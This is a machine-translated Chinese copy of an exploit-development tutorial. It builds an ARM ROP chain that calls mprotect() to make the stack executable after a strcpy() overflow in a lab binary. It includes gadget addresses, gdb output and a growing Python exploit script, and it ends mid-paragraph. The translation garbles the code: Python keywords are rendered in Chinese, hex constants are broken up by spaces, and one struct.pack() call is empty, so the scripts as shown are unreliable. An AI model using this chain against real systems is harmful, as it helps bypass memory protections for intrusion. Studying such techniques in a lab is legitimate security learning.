<html>
<head>
<title>Invoking mprotect() using ROP Chains in ARM</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">在ARM中使用ROP链调用mprotect()</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/invoking-mprotect-using-rop-chains-in-arm-d737bea2a9bb?source=collection_archive---------0-----------------------#2021-08-21">https://infosecwriteups.com/invoking-mprotect-using-rop-chains-in-arm-d737bea2a9bb?source=collection_archive---------0-----------------------#2021-08-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="e1f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你好，欢迎回来，</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="kq kr l"/></div></figure><p id="f35c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">今天我们将经历一些痛苦的事情。老实说，这并不痛苦，但很有趣。所以在本文中，我们将制作自己的ROP链来调用mprotect()。我会解释这一切，所以不要担心，但在此之前，你需要一些基础知识</p><p id="44b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我所说的基础知识是指你需要掌握一些关于利用ARM中的基本缓冲区溢出的知识，还应该熟悉ARM ROP链</p><p id="0fb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你没有这方面的知识，请<strong class="jp ir">自己武装</strong>。对于ROP链，我强烈推荐自己阅读下面这篇文章，我向你保证这25分钟是值得的。</p><blockquote class="ks kt ku"><p id="23f8" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><a class="ae kz" href="https://medium.com/@ad2001/rop-chains-on-arm-3f087a95381e" rel="noopener">https://medium.com/@ad2001/rop-chains-on-arm-3f087a95381e</a></p></blockquote><p id="74b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以，这些是阅读这篇文章的前提。现在让我们进入主题。</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="la kr l"/></div></figure><h1 id="b3e3" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">Mprotect介绍()</h1><p id="0045" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">你们中的大多数人应该对mprotect()有所了解，这就是为什么你们会点击这个按钮，对吗？？如果你不让我解释。</p><p id="cf84" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">为此，我将使用在线Linux手册页</p><blockquote class="ks kt ku"><p id="fbc7" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><a class="ae kz" href="https://pubs.opengroup.org/onlinepubs/009695399/functions/mprotect.html" rel="noopener ugc nofollow" target="_blank">https://pubs . open group . org/online pubs/009695399/functions/mprotect . html</a></p></blockquote><p id="6de0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kv"> mprotect </em>()函数应将访问保护更改为由<em class="kv"> prot </em>指定的访问保护，用于包含进程地址空间任何部分的整个页面，从地址<em class="kv"> addr </em>开始，持续到<em class="kv"> len </em>字节。</p><p id="35ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">很好理解？？</p><p id="bf50" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">抱歉，我只是在开玩笑。简而言之，mprotect()是一个可以用来改变内存区域保护的函数。例如，它可以将具有“读”权限的选择性存储器区域改变为具有“写”权限。它接受下面提到的三个参数</p><p id="fe8d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="kv"> addr </em> </strong>:需要改变保护的区域的起始地址。</p><p id="3d55" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="kv"> len </em> </strong>:需要改变保护的区域的长度，以字节为单位。</p><p id="a0d3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir"> <em class="kv"> prot </em> </strong>:是内存映射区域的期望保护。</p><blockquote class="ks kt ku"><p id="1c3d" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"><code class="fe me mf mg mh b">int mprotect(void *<em class="iq">addr</em>, size_t <em class="iq">len</em>, int <em class="iq">prot</em>);</code></p></blockquote><p id="331b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将在后面详细讨论这个函数。目前这已经足够了</p><p id="d8c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以这里的主要问题是，我们为什么要使用这个函数，在我们的开发中使用这个函数的目的是什么？？</p><p id="75f6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在之前的文章中，我写过ARM ROP链。如果你想一想我们为什么使用ROP链，主要原因是为了绕过NX(无执行)。NX使我们的栈不可执行，所以我们不能执行我们的外壳代码。为了绕过这个限制，我们想出了ROP链来调用其他函数，比如system()函数，它让我们能够生成shell。但是这是这次攻击的一些缺点。你能猜到吗？</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="mi kr l"/></div></figure><p id="c937" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们能用这些简单的ROP链做的事情(调用system())在某种程度上是有限的。简而言之，我们没有外壳代码赋予我们的完全自由。想象一下，如果您想要一个反向shell连接，我们可以很容易地用我们的shell代码做到这一点。我们可以用外壳代码做的事情更加灵活。但是在我们的例子中，NX是启用的，所以为了执行我们的外壳代码，我们需要我们的堆栈来执行。这就是mprotect()发挥作用的地方</p><p id="f752" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用mprotect()来改变堆栈的权限级别。简单地说，我们可以使用这个mprotect()函数使我们的<strong class="jp ir">堆栈再次可执行</strong>。听起来很棒吗？</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="mi kr l"/></div></figure><p id="2eb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">与我们对系统函数所做的不同，这有点复杂，因为在系统函数中我们只需要传递一个参数，但在这里我们需要传递三个参数来使我们的堆栈再次可执行。</p><p id="bbf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们再次深入我们的mprotect()函数。该函数有3个参数。我不想解释得太清楚，也不想浪费我们宝贵的时间，所以我只讲我们需要的东西。</p><p id="a13c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要传递三个论点。所以第一个参数是<em class="kv">地址</em>。<em class="kv">地址</em>是指我们需要改变权限模式的区域的地址。第二个参数是适用于权限更改的内存区域的长度/大小。最后，第三个参数需要权限的值。</p><p id="ae56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我解释一下传递这些值的原因。r1寄存器需要存储区的大小。因此，您可以使用任何适合我们有效载荷的值。我使用值0x10101010的原因是它不包含任何空字节，可以很容易地适应我们的外壳代码。</p><p id="90d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">值0x00000007用于授予对堆栈的读、写和<strong class="jp ir">执行</strong>权限。这样我们就可以使堆栈可执行。我想现在一切都清楚了。现在我们的寄存器包含</p><p id="860d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kv"> r0 —堆栈的地址</em></p><p id="5f65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kv">R1–0x 10101010(存储区的大小)</em></p><p id="ccb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="kv">R2–0x 00000007(用于读取、写入和执行)</em></p><p id="ce12" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在是时候找到小工具了。</p><p id="78a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以用ropper来做这个。我想你们知道如何使用ropper找到小工具。所以让我们开始一个一个地为每个寄存器寻找小工具。</p><p id="40e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在此之前，我将使用上一篇ROP链文章中的相同二进制文件。它使用易受攻击的<strong class="jp ir"> <em class="kv"> strcpy() </em> </strong>函数，导致缓冲区溢出，pc在24个字符后会被覆盖</p><blockquote class="ks kt ku"><p id="af39" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated"># include<stdio.h>T19】# include&lt;string . h&gt;</stdio.h></p><p id="dfed" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">int main(int argc，char * * argv)<br/>{<br/>char whatever[20]；<br/> strcpy(whatever，argv[1])；//漏洞</p><p id="66c1" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">返回0；<br/> }</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mj"><img src="../Images/fc60cb6148581735c62ae2fbb017e1b7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T5_p3HiM5A4SQ-Qup4jW5A.png"/></div></div></figure><h1 id="35ac" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">为r1查找小工具</h1><p id="bc9f" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我为r1寻找小工具的原因是因为它是最简单的。让我们开始吧</p><p id="c8bd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在我的azeria labs虚拟机中，我将使用ropper来查找小工具。所以我将<strong class="jp ir"> <em class="kv"> libc库</em> </strong>加载到ropper中，并开始搜索可以将数据从堆栈加载到r1的小工具。为此，我们可以使用包含<strong class="jp ir"> pop </strong>或<strong class="jp ir"> idr </strong>指令的小工具。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mq"><img src="../Images/0c2410eb6d8607cf534009f19da5480f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eBizzhfEpAb8E6Tp4_5_qg.png"/></div></div></figure><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/826bb1d00fc9d7e22c08abfea1be82de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*z7UgqhahHuSM6_g7J6Rw_A.png"/></div></figure><p id="ce38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如你所见，有许多小工具。但第三个小工具似乎是最合适和最简单的。我们将使用这个小工具将值0x10101010(大小)放入r1寄存器。所以我会用那个。您可以将此小工具复制到记事本或其他地方。</p><blockquote class="ks kt ku"><p id="758e" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x0010a1b8: pop {r1，PC }；</p></blockquote><p id="2817" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们继续我们的第二个小工具。</p><h1 id="87f8" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">为r0查找小工具</h1><p id="77f0" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">我们可以寻找将值加载到r0并返回我们的控制(pc)的小工具。我们将使用与查找r1小工具相同的方法。我们可以从之前的结果中寻找小工具。如果你仔细观察，第二个小工具将为我们做这项工作。</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi ms"><img src="../Images/8ffeafe885d44a37d4b48130c5c6b6ac.png" data-original-src="https://miro.medium.com/v2/resize:fit:1004/format:webp/1*EbJpE-De4o3xkjPSWAqb4w.png"/></div></figure><blockquote class="ks kt ku"><p id="8af5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x0007a12c: pop {r0，r4，PC }；</p></blockquote><p id="679c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这将从堆栈中弹出三个值到r0、r4和pc。我们将把堆栈的地址放在r0这里。像往常一样把这个小玩意复制到某个地方。继续我们最后的小工具。这是困难的部分，我会解释为什么</p><h1 id="9da3" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">为r2查找小工具</h1><p id="519f" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">继续我们最后的小工具。我们需要将值<strong class="jp ir"><em class="kv">0x 000000007</em></strong>放入r2寄存器，但是在这种情况下，我们不能使用POP或IDR小工具，为什么？？</p><p id="6b38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">再看数值。值为<em class="kv"/><strong class="jp ir"><em class="kv">0x 00000007</em></strong><em class="kv">。因此，即使我们手动提供该值，并尝试通过任何小工具将该值放入r2寄存器，也不会起作用，因为它有空字节。空字节会破坏我们的有效载荷，并且值0x00000007不会被复制到我们的r2寄存器。</em></p><p id="faba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么我们将如何解决这个问题呢？？</p><p id="87cd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以找到一个小工具，它可以将值0x00000007复制到寄存器中，从而破坏我们的漏洞。为此，我们可以使用一个包含值0x00000007作为硬编码值的小工具。有什么想法吗？</p><p id="697a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个问题的答案是<strong class="jp ir"> mov </strong>指令。因此，我们可以使用mov小工具将硬编码值0x00000007复制到r2寄存器中。让我们使用ropper找到这个小工具。</p><blockquote class="ks kt ku"><p id="298c" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">(libc _ 2.19 . so/ELF/ARM)&gt; search/1/mov</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mt"><img src="../Images/732f7d7f7b74a522b71e12d8fb1c50c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2a_E5h336dOi-izfU8xlSw.png"/></div></div></figure><p id="27b9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从结果中可以看出，没有小工具将值0x00000007直接复制到r2。但是小工具“mov r0，# 7；pop {r4，PC }；"可以将值7 (0x00000007)放入r0。所以我们可以用这个小工具把值放到r0，然后用另一个小工具把这个值移到r2。</p><blockquote class="ks kt ku"><p id="4d77" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x 000 D2 AC:mov r0，# 7；pop {r4，PC }；</p></blockquote><p id="502a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们来找一个小工具，将r0的值复制到r2。</p><blockquote class="ks kt ku"><p id="6766" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">(libc_2.19.so/ELF/ARM)&gt;搜索mov <br/> [INFO]搜索小工具:mov</p></blockquote><figure class="kl km kn ko gt kp gh gi paragraph-image"><div class="gh gi mu"><img src="../Images/f6d0603a4b901734d78f4f0fe7ba455a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/format:webp/1*kIKrVA18k_Dpowmn0Qj0Wg.png"/></div></figure><p id="c3fd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我发现了两个很好的工具。</p><blockquote class="ks kt ku"><p id="5039" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x000d9ef0: mov r2，r0；mov r0，R6；blx r3<br/> 0x000d9ef0: mov r2，r0；mov r0，R6；blx r3pop {r4，r5，r6，PC }；</p></blockquote><p id="db8f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在的问题是选择哪一个。嗯，我更喜欢第一个，因为它比第二个简单。</p><p id="627f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">哦，等等？？</p><p id="62bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分支到r3？？？</p><figure class="kl km kn ko gt kp"><div class="bz fp l di"><div class="mv kr l"/></div></figure><p id="3dad" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们甚至不能控制r3，而且r0现在包含7个。我们还需要将该值改回大小。我希望你在某个地方复制了所有的小工具。如果你这样做了，让我们开始解决这个问题。</p><h1 id="1597" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">修复漏洞</h1><p id="a164" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">让我们用现有的小工具开始编写python脚本。我会用纳米来做这个</p><blockquote class="ks kt ku"><p id="881b" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="3da2" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="02c5" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="3678" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；</p></blockquote><p id="8862" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是目前为止的利用情况。我不会像什么是struct，libc_base等那样逐行解释。我再次强烈推荐您阅读我在本文开头提到的ROP链文章。</p><p id="45f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里，libc_base变量包含libc基址，有效负载被制作到exp变量中。所以在覆盖了pc之后，我们把第一个小工具的地址。</p><p id="a9cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">该脚本将把值0x10101010放入r1，并交还控制权，以便我们可以执行下一个小工具。</p><p id="ce17" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我们可以将堆栈的地址放入r0寄存器。要找到这个地址，将程序加载到gdb中，在main中放一个bp，然后运行它。</p><blockquote class="ks kt ku"><p id="dbc0" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">pi@raspberrypi:~/asm/bof $ gdb。/BOF-ROP<br/>GNU gdb(Raspbian 7 . 7 . 1+dfsg-5+rpi 1)7 . 7 . 1<br/>Copyright 2014 Free Software Foundation，Inc .<br/>License GPLv3+:GNU GPL version 3或更高版本&lt;<a class="ae kz" href="http://gnu.org/licenses/gpl.html" rel="noopener ugc nofollow" target="_blank">http://gnu.org/licenses/gpl.html</a>&gt;<br/>这是自由软件:你可以自由更改和重新发布它。<br/>在法律允许的范围内，不提供任何担保。键入“显示复印”<br/>和“显示保修”了解详情。<br/>这个GDB被配置为“arm-linux-gnueabihf”。<br/>输入“显示配置”了解配置详情。<br/>关于bug报告的说明，请参见:<br/>&lt;<a class="ae kz" href="http://www.gnu.org/software/gdb/bugs/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/bugs/</a>&gt;。<br/>在<br/>&lt;<a class="ae kz" href="http://www.gnu.org/software/gdb/documentation/" rel="noopener ugc nofollow" target="_blank">http://www.gnu.org/software/gdb/documentation/</a>&gt;找到GDB手册和其他在线文档资源。如需帮助，请键入“help”。<br/>键入“apropos word”以搜索与“word”相关的命令……<br/>[*]没有调试会话处于活动状态<br/> GEF for linux就绪，键入“GEF”以启动，键入“gef config”以配置<br/>使用Python引擎2.7为GDB 7.7.1加载的56个命令<br/> [*] 4个命令无法加载，运行“gef missing”以了解原因。从…读取符号。/BOF-ROP……(找不到调试符号)……完成。<br/>GEF&gt;b main<br/>0x 10420处的断点1<br/>GEF&gt;r AAA</p></blockquote><p id="58cf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当它命中bp时，使用<strong class="jp ir"> vmmap </strong>命令检查堆栈的地址</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mw"><img src="../Images/61e3fcb033a88ac5649c4cfc8bf8ccf7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KVhTN0U2RBZIIzMVQMjf3Q.png"/></div></div></figure><p id="992d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">开始</strong>段的地址就是我们需要的地址。如果你仔细观察堆栈的权限，它会说“<em class="kv"> rw-”。</em>这表示堆栈有<em class="kv">读</em>和<em class="kv">写</em>的权限，但没有<em class="kv">执行</em>的权限。现在让我们修改漏洞</p><blockquote class="ks kt ku"><p id="ab37" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">#!/usr/bin/python</p><p id="83d6" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="51cf" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="33a0" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000)#堆栈基址<br/>exp+=(" AAAA ")<br/>exp+= struct . pack()</p></blockquote><p id="7fc1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们添加我们的其他小工具。</p><blockquote class="ks kt ku"><p id="453b" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">导入结构</p><p id="464b" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">base_libc = 0xb6e74000</p><p id="7385" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">exp = " A " * 24<br/>exp+= struct . pack("&lt;I "，base_libc+0x0010a1b8) # pop {r1，PC }；<br/> exp += struct.pack(" &lt; I "，0x 10101010)# size<br/>exp+= struct . pack("&lt;I "，base_libc+0x0007a12c) #pop {r0，r4，PC }；<br/> exp += struct.pack(" &lt; I "，0x bedfd 000)#堆栈基址<br/>exp+=(" AAAA ")#垃圾<br/> exp += struct.pack(" &lt; I "，base _ libc+0x 000 D2 AC)# mov r0，# 7；pop {r4，PC }；<br/>exp+=(" AAAA ")# junk<br/>exp+= struct . pack("&lt;I "，base_libc+0x000d9ef0) # mov r2，r0；mov r0，R6；blx r3</p></blockquote><p id="d931" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所有小工具都已添加。现在让我们试着解决我们的问题</p><p id="e7f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">首先，我们需要解决分支问题。要解决这个问题，我们需要控制r3，以便它将分支到我们控制的节点。所以让我们找一个小工具来帮助我们控制r3</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi mx"><img src="../Images/44c72dd665e983c655c25cbe1f1a24cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gxJilS0WtLLlZty0qkWJBA.png"/></div></div></figure><blockquote class="ks kt ku"><p id="8f74" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x00019270: pop {r3，PC }；</p></blockquote><p id="5e5b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是有史以来最简单的小工具！！！！！！。所以这会弹出一些东西给r3和pc。下一个问题是我们在r3里放什么。有什么猜测吗？</p><p id="ab2a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在这里，我们可以在r3中放一些东西，这样它就不会改变其他寄存器的值，也不会弄乱流程。这可以借助简单的“<em class="kv"> pop {pc}”指令来实现。</em>让我们再次使用ropper找到这个小工具</p><figure class="kl km kn ko gt kp gh gi paragraph-image"><div role="button" tabindex="0" class="mk ml di mm bf mn"><div class="gh gi my"><img src="../Images/9220e17dc9f6376a810273e4b0078c08.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Adqu8kcYEAtb1I6fiO0flQ.png"/></div></div></figure><blockquote class="ks kt ku"><p id="56b7" class="jn jo kv jp b jq jr js jt ju jv jw jx kw jz ka kb kx kd ke kf ky kh ki kj kk ij bi translated">0x0002df80: pop {r7，PC }；</p></blockquote><p id="c944" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是唯一一个简单的指令，没有太多的复杂性，因为r7对我们来说是一个无用的寄存器，我们不关心r7中的值。</p><p id="1df4" 